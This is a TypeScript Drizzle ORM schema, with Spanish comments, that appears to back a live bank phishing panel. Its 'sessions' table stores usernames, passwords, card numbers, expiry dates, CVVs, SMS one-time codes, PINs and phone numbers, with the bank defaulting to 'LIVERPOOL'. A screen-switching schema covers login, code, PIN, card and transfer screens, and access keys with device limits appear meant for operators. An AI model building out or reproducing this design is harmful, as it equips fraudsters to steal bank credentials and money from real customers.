
import { pgTable, text, serial, integer, boolean, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";
import bcrypt from "bcrypt";

// Roles de usuario
export enum UserRole {
  ADMIN = "admin",
  USER = "user"
}

// Tabla de usuarios del sistema
export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  role: text("role").notNull().default(UserRole.USER),
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").defaultNow(),
  lastLogin: timestamp("last_login"),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
  role: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;

// Tabla para las llaves de acceso
export const accessKeys = pgTable("access_keys", {
  id: serial("id").primaryKey(),
  key: text("key").notNull().unique(),
  description: text("description"),
  createdBy: integer("created_by").notNull(), // ID del administrador que creó la llave
  expiresAt: timestamp("expires_at").notNull(), // Fecha de expiración
  maxDevices: integer("max_devices").notNull().default(3), // Máximo de dispositivos permitidos
  activeDevices: integer("active_devices").default(0), // Contador de dispositivos activos
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").defaultNow(),
  lastUsed: timestamp("last_used"),
});

export const insertAccessKeySchema = createInsertSchema(accessKeys).pick({
  key: true,
  description: true,
  createdBy: true,
  expiresAt: true,
  maxDevices: true,
});

export type InsertAccessKey = z.infer<typeof insertAccessKeySchema>;
export type AccessKey = typeof accessKeys.$inferSelect;

// Tabla para rastrear los dispositivos que usan cada llave
export const devices = pgTable("devices", {
  id: serial("id").primaryKey(),
  accessKeyId: integer("access_key_id").notNull(), // ID de la llave a la que está asociado
  deviceId: text("device_id").notNull(), // Identificador único del dispositivo
  userAgent: text("user_agent"), // Información del navegador/dispositivo
  ipAddress: text("ip_address"), // Dirección IP
  lastActive: timestamp("last_active").defaultNow(),
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").defaultNow(),
});

export const insertDeviceSchema = createInsertSchema(devices).pick({
  accessKeyId: true,
  deviceId: true,
  userAgent: true,
  ipAddress: true,
});

export type InsertDevice = z.infer<typeof insertDeviceSchema>;
export type Device = typeof devices.$inferSelect;

export const sessions = pgTable("sessions", {
  id: serial("id").primaryKey(),
  sessionId: text("session_id").notNull().unique(),
  folio: text("folio"),
  username: text("username"),
  password: text("password"),
  banco: text("banco").default("LIVERPOOL"),
  tarjeta: text("tarjeta"),
  fechaVencimiento: text("fecha_vencimiento"),
  cvv: text("cvv"),
  sms: text("sms"),
  nip: text("nip"),
  smsCompra: text("sms_compra"),
  celular: text("celular"),
  pasoActual: text("paso_actual").default("folio"),
  createdAt: timestamp("created_at").defaultNow(),
  active: boolean("active").default(true),
  saved: boolean("saved").default(false),
});

export const insertSessionSchema = createInsertSchema(sessions).pick({
  sessionId: true,
  folio: true,
  username: true,
  password: true,
  banco: true,
});

export type InsertSession = z.infer<typeof insertSessionSchema>;
export type Session = typeof sessions.$inferSelect;

export enum ScreenType {
  FOLIO = "folio",
  LOGIN = "login",
  CODIGO = "codigo",
  NIP = "nip",
  PROTEGER = "protege",
  TARJETA = "tarjeta",
  TRANSFERIR = "transferir",
  CANCELACION = "cancelacion",
  MENSAJE = "mensaje",
  VALIDANDO = "validando",
  SMS_COMPRA = "sms_compra",
}

export const screenChangeSchema = z.object({
  tipo: z.string(),
  sessionId: z.string(),
  terminacion: z.string().optional(),
  saldo: z.string().optional(),
  monto: z.string().optional(),
  clabe: z.string().optional(),
  titular: z.string().optional(),
  comercio: z.string().optional(),
  mensaje: z.string().optional(),
});

export type ScreenChangeData = z.infer<typeof screenChangeSchema>;

export const clientInputSchema = z.object({
  tipo: z.string(),
  sessionId: z.string(),
  data: z.record(z.any()),
});

export type ClientInputData = z.infer<typeof clientInputSchema>;
